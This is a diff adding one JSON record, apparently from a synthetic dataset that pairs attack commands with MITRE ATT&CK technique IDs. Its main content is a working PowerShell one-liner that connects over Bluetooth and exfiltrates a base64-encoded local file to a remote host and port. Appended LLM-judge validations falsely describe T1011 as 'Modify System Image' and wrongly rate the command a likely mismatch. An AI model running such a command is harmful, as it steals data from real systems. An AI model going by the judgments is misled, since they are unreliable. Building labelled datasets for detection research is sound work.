@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $i=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$i\" static 10.226.38.2 255.255.255.252 | Out-Null; $buf=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\song.mp3'); $b=[Convert]::ToBase64String($buf); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.226.38.2'),0)); $cli.Connect('10.226.38.1',54295); $ns=$cli.GetStream(); [byte[]]$head=[Text.Encoding]::UTF8.GetBytes('POST /d HTTP/1.0`r`nX: bt`r`n`r`n'); $ns.Write($head,0,$head.Length); $bts=[Text.Encoding]::UTF8.GetBytes($b); $ns.Write($bts,0,$bts.Length); $ns.Close(); $cli.Close()",
+  "explanation": "Encodes binary data and transmits it as an HTTP-like POST over a custom TCP port bound to the Bluetooth PAN IP, leveraging the alternate Bluetooth medium (T1011).",
+  "rationale_steps": [
+    "Connect to a Bluetooth NAP to establish Bluetooth networking.",
+    "Configure the Bluetooth interface with a static IP via netsh.",
+    "Bind TCP client to the Bluetooth IP to constrain the egress path.",
+    "Send base64 payload over a high, uncommon TCP port using HTTP-like framing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-de7999c0",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, method calls, and piping operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does establish a Bluetooth connection and transmit data over it, it doesn't actually modify any system image or firmware as described in T1011, but rather uses Bluetooth as an exfiltration channel which aligns more with T1011.001 (Exfiltration Over Bluetooth).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T20:34:05.029340Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell command is perfectly well-formed with correct syntax, balanced elements, and valid cmdlets and methods.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration over an alternate Bluetooth channel, which is completely unrelated to MITRE ATT&CK T1011 'Modify System Image', making the claimed intent fundamentally misaligned with the technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T20:34:19.908750Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, valid separators, and plausible cmdlet/.NET usage.",
+        "semantic_score": 1,
+        "semantic_justification": "Implements exfiltration over a Bluetooth PAN/TCP channel rather than modifying any system or firmware image as described by the technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T20:34:53.239930Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
